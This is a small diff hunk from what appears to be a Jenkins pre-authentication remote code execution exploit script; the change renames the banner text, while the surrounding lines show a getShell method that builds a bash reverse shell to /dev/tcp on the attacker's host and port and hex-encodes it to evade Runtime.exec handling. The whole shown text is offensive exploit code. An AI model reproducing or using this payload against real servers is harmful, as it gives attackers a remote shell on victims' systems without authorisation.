@@ -18,7 +18,7 @@ class exploit():
 
 
   def getShell(self):
-    print("\r\n(m4ud) Magnificent Jenkins RCE")
+    print("\r\n(m4ud) Jenkins pre-auth RCE")
     print("\r\n[+] Escaping the claws of Runtime.getRuntime().exec() [+]\r\n")
     shell = "bash -i >&/dev/tcp/%s/%s 0>&1|/bin/bash -i" % (self.lhost, self.lport)
     v = binascii.hexlify(bytes(shell, encoding='utf-8')).decode()
